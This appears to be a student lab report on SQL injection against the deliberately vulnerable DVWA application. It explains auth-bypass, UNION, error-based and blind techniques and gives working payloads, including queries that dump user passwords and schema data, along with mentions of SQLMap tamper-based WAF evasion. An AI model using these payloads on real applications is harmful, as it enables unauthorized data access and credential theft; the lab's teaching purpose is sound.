# Assignment 04 Technical Report: SQL Injection Mastery & Exploitation Engineering

## 1. Executive Summary
Assignment 04 examines SQL Injection (SQLi) vulnerabilities across all standard operational categories: In-band (UNION-based), Error-based, Inferential (Boolean-based Blind), and Time-based Blind. We evaluate manual exploitation workflows, custom Python extraction automation, and automated validation via SQLMap against allowlisted target environments.

## 2. Lab Artifacts & Architecture

| Component | Scope / Description | File Path |
| :--- | :--- | :--- |
| **Curated Payload Library** | 4 segmented dictionaries with inline technical commentary explaining filter context and query targets | `assignment-04-sqli/payloads/` (`auth-bypass.txt`, `union.txt`, `error-based.txt`, `blind.txt`) |
| **SQLMap Automation Harness** | Script wrapper pinning execution to `http://dvwa` with session cookie and CSRF handling | `assignment-04-sqli/sqlmap/run_sqlmap.sh`, `cookbook.md` |
| **Boolean Blind Extractor** | Pure-Python character-by-character binary/linear search script with safety request caps | `assignment-04-sqli/scripts/blind_boolean.py` |
| **Time-based Blind Extractor** | Script measuring HTTP latency deltas (`SLEEP(2)`) to extract data without visual cues | `assignment-04-sqli/scripts/blind_time.py` |
| **Unit Test Suite** | Pytest harness mocking HTTP responses to test extractor algorithms and safety thresholds | `tests/test_blind.py` |
| **DVWA Walkthroughs** | End-to-end technical exploitation guides for Low, Medium, and High security tiers | `assignment-04-sqli/walkthroughs/` (`low.md`, `medium.md`, `high.md`) |

---

## 3. SQL Injection Classification & Exploitation Mechanics

### 3.1 Authentication Bypass
- **Mechanism**: Injecting boolean truth conditions (e.g. `admin' -- ` or `' OR 1=1 #`) into SQL clauses forcing evaluation to `TRUE`, bypassing password checks:
  ```sql
  SELECT * FROM users WHERE user = 'admin' -- ' AND password = 'md5(...)';
  ```

### 3.2 UNION-Based Injection
- **Mechanism**: Combining the original query with an attacker query to extract arbitrary database schemas and tables.
- **Workflow**:
  1. Determine column count using `ORDER BY 1`, `ORDER BY 2`, ... until error.
  2. Determine data types and reflection points: `UNION SELECT 1, 2`.
  3. Extract database metadata:
     ```sql
     UNION SELECT null, CONCAT(schema_name) FROM information_schema.schemata
     UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()
     UNION SELECT user, password FROM users
     ```

### 3.3 Error-Based Injection
- **Mechanism**: Forcing database runtime errors that reflect extracted data within error diagnostics (e.g., `XPATH syntax error` via `ExtractValue()` or `UpdateXML()`):
  ```sql
  AND updatexml(1, concat(0x7e, (SELECT version()), 0x7e), 1)
  ```

### 3.4 Inferential Blind SQL Injection (Boolean & Time)
- **Boolean Blind**: When the web application returns binary responses (e.g., "User ID exists" vs. "Missing") without echoing data. The extractor submits:
  ```sql
  1' AND SUBSTRING((SELECT user()), 1, 1) = 'a' #
  ```
  Observing the difference in DOM text reveals the character.
- **Time-Based Blind**: When the application produces zero differential output. Execution delays are measured:
  ```sql
  1' AND IF(ASCII(SUBSTRING((SELECT database()), 1, 1)) = 100, SLEEP(2), 0) #
  ```

---

## 4. Manual vs. Automated SQLMap Correlation

| Metric / Capability | Manual Testing | Automated SQLMap |
| :--- | :--- | :--- |
| **Speed & Throughput** | Low (painstaking for blind character extraction) | Extremely High (multithreaded bisect algorithms) |
| **Detection Precision** | High control, zero unnecessary network noise | Broad footprint; triggers WAFs without tamper scripts |
| **WAF Bypass Adaptability** | Custom encoding tailored to exact regex filter | Requires chaining `--tamper` scripts (e.g. `charencode`) |
| **Database Fingerprinting** | Step-by-step query trials | Automated dialect detection (`--dbms=mysql`) |

---

## 5. Execution & Verification Status

| Task / Requirement | Implementation Method | Execution Status | Evidence Reference |
| :--- | :--- | :--- | :--- |
| Curated SQLi Payloads (4 categories) | Commented payload dictionaries | `AUTOMATED-PASS` | `assignment-04-sqli/payloads/` |
| Boolean Blind Python Script | Pure-Python extractor with request cap | `AUTOMATED-PASS` | `assignment-04-sqli/scripts/blind_boolean.py` |
| Time-based Blind Python Script | Pure-Python timing delta extractor | `AUTOMATED-PASS` | `assignment-04-sqli/scripts/blind_time.py` |
| Unit Test Suite (Blind Mock) | Pytest mock test suite | `AUTOMATED-PASS` | `tests/test_blind.py` (Passed) |
| SQLMap Automation Wrapper | Shell script pinned to `http://dvwa` | `AUTOMATED-PASS` | `assignment-04-sqli/sqlmap/run_sqlmap.sh` |
| DVWA Low/Medium/High Walkthroughs | Structured technical analysis docs | `AUTOMATED-PASS` | `assignment-04-sqli/walkthroughs/` |
| Live SQLMap Run on Container | Automated dump of live MySQL DB | `[HUMAN-EXECUTED — PENDING]` | Requires `make up` and running `run_sqlmap.sh` |

---

## 6. Reviewer Reproduction Steps
1. Execute unit tests for the blind injection algorithms:
   ```bash
   pytest tests/test_blind.py -v
   ```
2. Verify allowlist enforcement on custom extractor scripts:
   ```bash
   python assignment-04-sqli/scripts/blind_boolean.py --target http://127.0.0.1:8080/vulnerabilities/sqli_blind/
   ```
   *(Passing external hostnames e.g. `--target http://google.com` will immediately abort with a security exception).*
